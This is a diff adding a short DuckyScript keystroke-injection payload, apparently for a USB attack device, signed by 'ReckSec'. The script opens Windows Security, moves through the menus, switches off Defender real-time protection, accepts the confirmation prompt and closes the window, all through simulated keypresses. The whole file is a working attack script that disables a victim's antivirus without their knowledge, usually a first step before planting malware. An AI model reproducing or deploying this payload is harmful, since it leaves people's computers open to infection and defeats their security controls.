@@ -1,0 +1,33 @@
+REM basic script to disable windows real time protection, then closes the tab
+REM made by ReckSec please give creds if making a video or somethin :)
+
+DELAY 1000
+GUI
+DELAY 500
+STRING windows security
+DELAY 500
+ENTER
+DELAY 2000
+ENTER
+DELAY 500
+DOWN
+DELAY 500
+DOWN
+DELAY 500
+DOWN
+DELAY 500
+DOWN
+DELAY 500
+DOWN
+DELAY 500
+DOWN
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 1000
+LEFT
+DELAY 500
+SPACE
+DELAY 1000
+ALT F4
